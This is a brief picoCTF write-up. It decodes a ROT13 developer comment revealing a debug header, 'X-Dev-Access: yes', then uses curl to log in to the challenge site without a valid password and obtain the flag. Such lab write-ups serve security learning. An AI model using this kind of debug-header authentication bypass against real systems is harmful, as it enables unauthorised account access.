
In the comment of code, there is note should be deleted.
And, that is encrypted by ROT13.

```
▶ echo "ABGR: Wnpx - grzcbenel olcnff: hfr urnqre K-Qri-Npprff: lrf" | tr 'A-Za-z' 'N-ZA-Mn-za-m' 
NOTE: Jack - temporary bypass: use header X-Dev-Access: yes
```

Use X-Dev-Access header

```
▶ curl -i -X POST -H "Content-Type: application/json" -H "X-Dev-Access: yes" "http://amiable-citadel.picoctf.net:61258/login" -d '{"email":"ctf-player@picoctf.org", "password":"t"}' 
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 127
ETag: W/"7f-/esLDsDVBO4EeVKQoUzyzMrgG6o"
Date: Tue, 18 Nov 2025 08:24:14 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{ZZZZZZZZZZZZZZZZZZZZZZZ}"}%                                                                         ```

Flag appeared!
